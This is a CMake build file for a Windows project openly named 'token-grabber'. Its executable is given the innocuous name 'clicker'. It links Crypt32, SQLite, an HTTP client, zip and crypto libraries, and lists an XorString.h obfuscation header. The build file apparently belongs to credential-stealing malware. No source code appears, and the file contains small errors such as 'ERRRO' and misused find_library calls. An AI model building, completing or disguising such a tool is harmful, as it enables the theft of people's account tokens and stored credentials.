cmake_minimum_required(VERSION 3.15)

project(token-grabber VERSION 1.0.0)

if(CMAKE_CXX_COMPILER MATCHES "x64/cl.exe")
    set(__ARCH "x64")
elseif(CMAKE_CXX_COMPILER MATCHES "x86/cl.exe")
    set(__ARCH "x86")
else()
    set(__ARCH "xUNKNOWN")
    message(ERRRO "Can't determine target architecture")
endif()

#now setting triplet
if(CMAKE_BUILD_TYPE MATCHES Debug)
    set(VCPKG_TARGET_TRIPLET "${__ARCH}-windows-static-md" CACHE STRING "target triplet" FORCE)
    message(STATUS "Target triplet for debug is " ${VCPKG_TARGET_TRIPLET})
else()
    set(VCPKG_TARGET_TRIPLET "${__ARCH}-windows-static" CACHE STRING "target triplet" FORCE)
    message(STATUS "Target triplet for release is " ${VCPKG_TARGET_TRIPLET})
endif(CMAKE_BUILD_TYPE MATCHES Debug)

if(MSVC)
    add_compile_options(
        $<$<CONFIG:>:/MT> #---------|
        $<$<CONFIG:Debug>:/MTd> #---|-- Statically link the runtime libraries
        $<$<CONFIG:Release>:/MT> #--|
    )
endif()

find_package(cryptopp CONFIG REQUIRED)
find_library("C:/Windows/System32" Crypt32)
find_library("C:/Windows/System32" User32)
find_package(nlohmann_json CONFIG REQUIRED)
find_package(cpr CONFIG REQUIRED)
find_package(unofficial-sqlite3 CONFIG REQUIRED)
find_package(libzippp CONFIG REQUIRED)

set(CMAKE_CXX_STANDARD 17)
set(GRABBER_NAME clicker)

add_executable(${GRABBER_NAME} 
src/main.cxx
src/base64.h
src/XorString.h
src/cpuinfo.h
)

target_link_libraries(${GRABBER_NAME} PRIVATE cryptopp::cryptopp)
target_link_libraries(${GRABBER_NAME} PRIVATE Crypt32)
target_link_libraries(${GRABBER_NAME} PRIVATE User32)
target_link_libraries(${GRABBER_NAME} PRIVATE nlohmann_json::nlohmann_json)
target_link_libraries(${GRABBER_NAME} PRIVATE cpr::cpr)
target_link_libraries(${GRABBER_NAME} PRIVATE unofficial::sqlite3::sqlite3)
target_link_libraries(${GRABBER_NAME} PRIVATE libzip::zip libzippp::libzippp)
